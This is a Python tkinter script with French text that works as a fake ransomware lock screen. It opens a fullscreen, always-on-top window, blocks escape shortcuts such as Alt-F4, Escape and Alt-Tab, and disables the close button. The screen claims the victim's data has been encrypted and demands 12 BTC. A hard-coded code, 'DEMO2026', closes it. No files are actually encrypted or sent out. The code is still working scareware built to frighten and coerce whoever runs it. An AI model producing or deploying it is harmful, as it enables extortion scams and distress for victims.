import tkinter as tk
import random

root = tk.Tk()
root.attributes('-fullscreen', True, '-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')
root.grab_set()
root.focus_force()

def ignore(event): return 'break'
for t in ['<Alt-F4>','<Escape>','<Control-q>','<Control-w>','<Alt-Tab>',
          '<Control-Tab>','<Control-Escape>','<Alt-Escape>','<Win_L>','<Win_R>',
          '<Shift-Escape>','<Control-Shift-Escape>','<Alt-Delete>','<Control-Delete>']:
    root.bind(t, ignore)
root.bind('<Button-3>', ignore)
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Effet d'arrière-plan : des labels avec des symboles qui changent de couleur
symboles = ['💀', '🕹️', '🔓', '⚡', '🛡️', '🐉', '🔒', '💰', '📀', '👾', 'D', 'S']
frames = []
for _ in range(50):
    x = random.randint(0, root.winfo_screenwidth())
    y = random.randint(0, root.winfo_screenheight())
    lbl = tk.Label(root, text=random.choice(symboles), font=("Arial", random.randint(12, 24)),
                   fg=random.choice(['#0f0','#0a0','#0c0']), bg='black')
    lbl.place(x=x, y=y)
    frames.append(lbl)

def animer():
    for lbl in frames:
        # Déplacer aléatoirement
        x = lbl.winfo_x() + random.randint(-3, 3)
        y = lbl.winfo_y() + random.randint(1, 5)
        if x > root.winfo_screenwidth() or x < 0 or y > root.winfo_screenheight():
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(-50, -10)
        lbl.place(x=x, y=y)
        # Changer parfois le symbole
        if random.random() < 0.05:
            lbl.config(text=random.choice(symboles), fg=random.choice(['#0f0','#0a0','#0c0']))
    root.after(100, animer)

animer()

# Interface centrale
frame_centre = tk.Frame(root, bg='black')
frame_centre.place(relx=0.5, rely=0.5, anchor='center')

tk.Label(frame_centre, text="💀 VOS DONNEES ONT ETE CHIFFREES 💀", font=("Arial",32,"bold"), fg="red", bg="black").pack(pady=20)
tk.Label(frame_centre, text="TOUTE TENTATIVE DE CONTOURNEMENT ENTRAÎNERA LA PERTE DÉFINITIVE.\n"
                            "PAYEZ 12 BTC A L'ADRESSE CI-DESSOUS.\n",
         font=("Arial",14), fg="white", bg="black").pack()
tk.Label(frame_centre, text="CODE D'ACCÈS :", font=("Arial",18,"bold"), fg="yellow", bg="black").pack(pady=15)

entry = tk.Entry(frame_centre, font=("Arial",24), justify='center', bg='gray20', fg='white')
entry.pack(pady=10)
entry.focus()

def valider():
    if entry.get() == "DEMO2026":
        for w in frame_centre.winfo_children(): w.destroy()
        for lbl in frames: lbl.destroy()
        tk.Label(frame_centre, text="DEADSEC Tiens Toujours Ses Promesses\nByeeeeeee",
                 font=("Arial",24,"bold"), fg="lime", bg="black").pack(expand=True)
        root.after(3000, lambda: [root.grab_release(), root.destroy()])
    else:
        entry.delete(0, 'end')
        tk.Label(frame_centre, text="CODE INCORRECT - DERNIER AVERTISSEMENT !",
                 fg="red", bg="black").pack()

tk.Button(frame_centre, text="DÉBLOQUER", font=("Arial",20,"bold"), command=valider, bg="lime", width=20).pack(pady=15)
tk.Label(frame_centre, text="789bf0d234de0e8c78319c78ac1fe0485082b062f900322176f500c0c1c12ccc",
         font=("Courier",18,"bold"), fg="cyan", bg="black").pack(side="bottom", pady=20)

root.mainloop()